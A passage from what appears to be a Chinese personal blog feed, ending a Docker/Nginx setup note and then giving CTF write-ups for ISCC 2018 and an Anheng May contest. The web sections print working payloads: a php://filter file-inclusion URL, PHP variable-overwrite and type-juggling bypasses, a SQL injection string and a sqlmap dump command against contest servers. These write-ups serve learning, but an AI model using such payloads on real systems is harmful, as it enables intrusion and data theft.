class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">cd</span> /var/www/html</span><br><span class="line">vim index.html</span><br></pre></td></tr></table></figure><p>自己喜欢写点啥就写啥吧</p><p>查找一下Nginx文件的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis nginx</span><br></pre></td></tr></table></figure><p>查看etc下面的Nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/nginx</span><br></pre></td></tr></table></figure><p>进去里面的sites-enabled目录里面，发现一个default文件打开编辑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/nginx/sites-enabled</span><br><span class="line"> vim default</span><br></pre></td></tr></table></figure><p>改变root的值为你的网页目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root: /var/www/html</span><br></pre></td></tr></table></figure><p>开始运行nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure><p> <code>ps -ef</code> 查看相关进程是否启动</p><p>让它继续后台运行<br>可以用下面几个命令查看端口号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps </span><br><span class="line">docker port 容器ID/名字</span><br><span class="line">docker top 容器ID/名字</span><br></pre></td></tr></table></figure><p>然后再curl一波就知道，是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1:32770</span><br></pre></td></tr></table></figure><p>也可以本机的浏览器里面打开。。</p><p>还可以用容器的ip地址去实现在本机浏览器的浏览</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 容器ID/名字</span><br></pre></td></tr></table></figure><p>可以看到容器ip地址和映射端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“IPAddress”: “172.17.0.2”</span><br><span class="line">“HostPort”: “32768”</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.17.0.2</span><br></pre></td></tr></table></figure><p>这就不需要指定端口号了，用默认的80端口就可以访问<br>停止该容器，然后再次启动</p><p>我们需要注意一旦我们关闭并且重新启动的话，docker分配的映射ip以及端口地址都会改变，需要重新查看</p><p>镜像标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TAG </span><br><span class="line"> ubuntu:latest</span><br><span class="line"> ubuntu:14.04</span><br></pre></td></tr></table></figure><p>啥都不写默认<code>latest</code>标签</p><p>删除镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像名:标签/ID</span><br></pre></td></tr></table></figure><p>搜索镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search</span><br></pre></td></tr></table></figure><p>拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> docker pull 你搜到的镜像名</span><br><span class="line">docker push命令可以将某一个镜像发布到官方网站。</span><br></pre></td></tr></table></figure><p>利用DockerFile构建镜像 ,这个东西有时候还是很好用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t=<span class="string">'自定义名字'</span> DockerFile</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境部署 </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ISCC 2018做题记录</title>
      <link href="/2018/05/25/ISCC-2018-wp/"/>
      <url>/2018/05/25/ISCC-2018-wp/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉自己好菜，只会做几个题目，而且打打停停，还要应付各种考试，忙不过来，以后还是要更加努力学习啊。。还是先记录一下自己的做题过程，慢慢进步，跟不上大佬们的步伐啊emmm。。<br><a id="more"></a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>直接改图片高度就好<br><img src="https://s1.ax1x.com/2018/05/25/CfUge0.png" alt="CfUge0.png"><br>得到flag<br><img src="https://s1.ax1x.com/2018/05/25/CfURoT.png" alt="CfURoT.png"></p><h3 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h3><p>打开文件发现是一堆AB立刻想到是培根密码，直接培根解密得到flag，注意最后提交的是大写</p><h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p>发现一段<code>base64</code>编码。不断base64解码，注意期间还要URL编码，这就有点麻烦了，当你base64解码不行的时候，尝试一下<code>AES解密</code>，这里key为空，解密网址 <a href="http://tool.oschina.net/encrypt/" target="_blank" rel="noopener">http://tool.oschina.net/encrypt/</a><br>得到下面的东西<br>答案就是后面这句但已加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗</span><br></pre></td></tr></table></figure><p>这里有点脑洞了，我之前不知道有这种东西，叫<code>与佛论禅</code><br>解密网址 <a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br>解密后得到flag</p><h3 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h3><p>这个题目一开始用HXD打开发现里面存在某款软件的文件名<br><img src="https://s1.ax1x.com/2018/05/25/CfUISJ.png" alt="CfUISJ.png"></p><p>于是立即下载使用该软件打开这张图片，发现下面有多个图层，是一张二维码，直接拼接扫描即可<br><img src="https://s1.ax1x.com/2018/05/25/CfUol9.png" alt="CfUol9.png"></p><h3 id="秘密电报-1"><a href="#秘密电报-1" class="headerlink" title="秘密电报"></a>秘密电报</h3><p>直接十六进制解码即可</p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>根据题目应该是凯撒密码位移13位也就是rot13，然后就是脑洞题目了，键盘密码，每一位都是对应键盘的下一行，直接出来flag</p><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p>这个题目也很厉害，我弄了很久，但是里面也有与佛论禅。。。。<br>先是在HXD里面找到了office的踪迹，于是我手动提取出来，可能别的大佬有更好的方法<br><img src="https://s1.ax1x.com/2018/05/25/CfU7O1.png" alt="CfU7O1.png"><br>然后打开<br><img src="https://s1.ax1x.com/2018/05/25/CfUqw6.png" alt="CfUqw6.png"><br>又是与佛论禅，出题人是有多喜欢。。。<br>解出来发现是一堆16进制，房间converter里面解码<br>得到一堆base64，再解一下就是base32,再解一下16进制，就是这样一直解下去就好</p><h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p>这道题目考了一个zip包的伪加密，然后直接凯撒解密就好。。。很简单</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>直接改前端代码就好，改大一点<br><img src="https://s1.ax1x.com/2018/05/25/CfUjYD.png" alt="CfUjYD.png"><br>然后输入数字，得到flag</p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>这题很简单，直接改xff为127.0.0.1即可</p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p>打开发现一段类似base64的东西，首先要把这东西url编码之后再解base64，发现一段以+开头以-结尾的编码，utf7编码，给个解码网址 <a href="http://toolswebtop.com/text/process/decode/utf-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/decode/utf-7</a></p><p>得到 <code>&lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script&gt;</code><br>把<code>/%nsfocusXSStest%/</code>提交到文本框里就可以得到flag了</p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p>这个题目考的是文件包含漏洞，利用f参数读取，根据f参数猜测后台为include(‘文件名’.’php’) ,尝试用伪协议把源码读出来，但题目说了要绕过，肯定不简单<br>这里我们用大写去绕过，读取index.php<br><a href="http://118.190.152.202:8008/index.php?f=PHP://filter/read=convert.base64-encode/resource=index&amp;id=2" target="_blank" rel="noopener">http://118.190.152.202:8008/index.php?f=PHP://filter/read=convert.base64-encode/resource=index&amp;id=2</a><br>得到一串base64，解码之后得到flag</p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p>改一下Client-ip:127.0.0.1 发包就得到flag</p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>这个题是代码审计题目，源码在index.php.txt 里面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"flag is here"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag: "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一开始这一题还是懵，不知道flag究竟放在哪个变量里面，经过提示是在$flag里面，有确定的目标就很好做了<br>发现代码里面有两个<code>$</code>,利用了变量覆盖把flag参数里面的内容改掉，然后最后利用die函数把flag里面的内容打印出来<br>我们得先获得<code>$flag</code>变量里面的内容，我们可以利用get的变量覆盖把里面的内容赋值到<code>$_200</code>这一个变量里面，这样就可以充分利用<code>die</code>这一个函数了<br>然后下面紧接着一个post的变量覆盖还有一个post的判断，但是此时我们并不知道<code>$flag</code> 里面的内容，我们只能利用变量覆盖改变<code>$flag</code>里面的内容，这也说明了<code>$flag</code>这个变量是可控的。。我们可以随意的修改并且绕过判断，这样我们就可以得到flag了<br> payload:<br>get数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8009?_200=flag</span><br></pre></td></tr></table></figure><p>post数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=1</span><br></pre></td></tr></table></figure><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><p>首先进去第一关是MD5弱类型比较，直接找一个QNKCDZO代入就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123; </span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>]; </span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    $username=<span class="string">"hello"</span>; </span><br><span class="line">    $password=<span class="string">"hello"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(md5($password) == <span class="number">0</span>)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"xxxxx"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二关发现两个$，于是尝试一波<code>GLOBALS</code>全局变量，get一个<code>a=GLOBALS</code> 直接出flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </span><br><span class="line">$a = @$_REQUEST[<span class="string">'a'</span>]; </span><br><span class="line">str_replace(<span class="string">"&#123;"</span>,<span class="string">""</span>,$a); </span><br><span class="line">str_replace(<span class="string">"&#125;"</span>,<span class="string">""</span>,$a); </span><br><span class="line">@<span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>); </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/25/CfaFTf.png" alt="CfaFTf.png"></p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>非预期解<br>直接上御剑扫描目录发现有flag.txt访问即可</p><p>预期解<br>好像是利用ping参数去执行各种命令，用%0a去绕过好像。。。没有详细去尝试</p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>这也是个代码审计的题目，题目隐藏在index.php.txt里面，发现出题人很喜欢把源代码放在这个文件里面啊</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">"***********"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == strcasecmp($flag,$_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line">$a = fla;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"very good!Username is right"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Username is not right&lt;!--index.php.txt--&gt;'</span>;&#125;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Please give me username or password!'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (is_numeric($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] &gt; <span class="number">999</span>)&#123;</span><br><span class="line">$b = g;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;very good!Password is right&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too little&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too long&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password is not numeric&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($a.$b == <span class="string">"flag"</span>)</span><br><span class="line"><span class="keyword">print</span> $flag;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个很简单的绕过，只是组合这来考查数据的表示方法绕过还有数组绕过</p><p>首先这个函数<code>strcasecmp</code>出现在<code>==</code>后面，一旦<code>==</code>出现我们就要警惕了，这里我们可以使这个函数报错然后使之满足弱类型<code>0 == false</code>这样就绕过了第一个判断，使<code>$a=fla</code>，这是为了使后面的<br><code>if ($a.$b == &quot;flag&quot;)</code>，然后在审计下面的<code>password</code>部分，password的部分其实就是一个典型的数字绕过的代码审计题目，我们可以选择用科学计数法去绕过，这里我用的是<code>9e9</code>,所以我最后的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8017/?username[]=123&amp;password=9e9</span><br></pre></td></tr></table></figure><h3 id="为什么这么简单啊"><a href="#为什么这么简单啊" class="headerlink" title="为什么这么简单啊"></a>为什么这么简单啊</h3><p>这一题根据题目给的提示把referer还有各种有关ip的参数都改掉发包发现一个奇怪的地址<br><img src="https://s1.ax1x.com/2018/05/25/CfaPmt.png" alt="CfaPmt.png"><br>打开地址的源代码发现有一段奇怪的base64<br><img src="https://s1.ax1x.com/2018/05/25/CfaVfg.png" alt="CfaVfg.png"><br>解码发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;password:xinyiji.com&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这个就是密码，输入就得到flag</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="RSA256"><a href="#RSA256" class="headerlink" title="RSA256"></a>RSA256</h3><p>这个题完全考的不是逆向，完完全全的密码学RSA<br>打开发现一个公钥文件<br>用OpenSSL打开公钥文件得到他的模数n，于是去factordb.com分解一波模数<br>得到p和q<br>然后常规操作得到秘钥d<br>然后用rsa-tool得到秘钥文件，又重新用openssl以一个解密就好</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> encrypted.message1 -inkey key.pem -out flag.txt</span><br><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> encrypted.message2 -inkey key.pem -out flag2.txt</span><br><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> encrypted.message3 -inkey key.pem -out flag3.txt</span><br></pre></td></tr></table></figure><p>我们把文件重定向以后就得到flag<br><img src="https://s1.ax1x.com/2018/05/25/Cfan6s.png" alt="Cfan6s.png"></p><p>最后在此求一波大佬的wp学习啊。。。。。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安恒5月赛web题目做题记录</title>
      <link href="/2018/05/24/anheng-5month/"/>
      <url>/2018/05/24/anheng-5month/</url>
      <content type="html"><![CDATA[<h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>这是一道代码审计的题目，又发现了一个我以前没见过的知识点，可以详细看看这个链接<br><a href="https://wooyun.shuimugan.com/bug/view?bug_no=64792" target="_blank" rel="noopener">https://wooyun.shuimugan.com/bug/view?bug_no=64792</a><br><a id="more"></a><br><img src="https://s1.ax1x.com/2018/05/24/CWrqSS.png" alt="CWrqSS.png"><br>从上面可以看出，简单点解释就是当代码中存在<code>$_REQUEST[&#39;user_id&#39;]</code>里面类似的参数的时候，我们在url上可以这样<code>a.php?user.id</code>传参去进行绕过,这样进去之后也能表示<code>$_REQUEST[&#39;user_id&#39;]</code>的值，同样可以绕过的符号还有<code>+，[</code> 等，应该说是php的一个小特性，上面讲的很清楚了，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>阅读代码发现，首先第一步要绕过A_A这个符号，如果出现这个符号他就会显示<code>A_A,have fun</code>，就不能继续往下面执行到<code>file_get_contents(&#39;flag.php&#39;)</code>了，但是我们发送get参数的时候又必须要发送，因此我们就用到刚才的知识点，我们可以用<code>A.A</code>或者是<code>A+A</code>去传参去绕过。<br>下面的代码就是常规的数字绕过了，但这里也用到了一个trick，就是无论你的数字多大，对于数组而言总是比数组小，下面是操作<br><img src="https://s1.ax1x.com/2018/05/24/CWrXLj.png" alt="CWrXLj.png"><br>所以说，我们可以利用数组去绕过<code>$str&lt;9999999999</code>的特性，下面一个判断是强制转化为字符串在与数字比较的判断，这就是平常操作很多的弱类型了，直接让参数等于admin就可以了，因为<code>“admin”== 0</code> ，结果是true，直接等于0绕过即可，所以这题的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10007/?A+A[]=admin</span><br></pre></td></tr></table></figure><h2 id="不能注册的admin"><a href="#不能注册的admin" class="headerlink" title="不能注册的admin"></a>不能注册的admin</h2><p>这一个题目利用了Windows不区分大小写特性的特点<br>右键发现发现有一段代码很可疑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">id = $(<span class="string">"#uid"</span>).val();</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">"#uid"</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(id !== <span class="string">""</span>|| !id)&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span class="string">"json.php"</span>,<span class="attr">type</span>:<span class="string">'post'</span>,<span class="attr">data</span>:&#123;<span class="string">'id'</span>:id&#125;,<span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> data = <span class="built_in">eval</span>(<span class="string">'('</span> +d +<span class="string">')'</span>);</span><br><span class="line"><span class="keyword">if</span>(data[<span class="string">'id'</span>] !=<span class="string">'undefined'</span> ||data[<span class="string">'id'</span>] !=<span class="string">""</span> ||data[<span class="string">'id'</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">alert(<span class="string">'用户名已存在!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>仔细查看代码发现存在<code>json.php</code>还有post一个id参数，到后面看了解题的视频发现其实这里还能用get方式传参，我们就进去json.php页面查看一下，竟然题目说了要admin就传一个admin进去，发现有回显<code>{&#39;id&#39;:&#39;1&#39;,&#39;title&#39;:&#39;admin&#39;}</code>，尝试一下是否存在sql注入漏洞，在尝试双引号的时候发现有报错信息，然后详细一点测试<code>json.php?id=admin&quot; or 1=1%23</code>,发现有检测，这就很尬，后来还是看了视频才知道是从头部信息哪里发现的服务器是<code>Windows</code>的，这样就可以用Windows的大小写特性去绕过，就可以尝试一下<code>json.phP?id=admin&quot; or 1=1%23</code>，重新回显<code>{&#39;id&#39;:&#39;1&#39;,&#39;title&#39;:&#39;admin&#39;}</code>，这就可以慢慢注入了啊，接下来就是sqlmap一把过就行。。。。说实话我是真想不到，还是要虚心学习啊</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://101.71.29.5:10006/json.Php?id=admin&quot;  --threads 10 -D 5monthweb -T article -C content --dump</span><br></pre></td></tr></table></figure><p>最后得到结果<br><img src="https://s1.ax1x.com/2018/05/24/CWrves.png" alt="CWrves.png"></p><h2 id="一个hackerone的有趣的漏洞的复现的题目"><a href="#一个hackerone的有趣的漏洞的复现的题目" class="headerlink" title="一个hackerone的有趣的漏洞的复现的题目"></a>一个hackerone的有趣的漏洞的复现的题目</h2><p>这题考了.git源码泄露，把源码拿下来以后打算第二天做。。。这个题目第二天做的时候因为平台维护不能复现了，下次还是早点做吧。。还得继续努力。。。。。</p><p><img src="https://s1.ax1x.com/2018/05/24/CWrzoq.png" alt="CWrzoq.png"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cumt2018校赛部分write up</title>
      <link href="/2018/05/21/cumt-2018-final/"/>
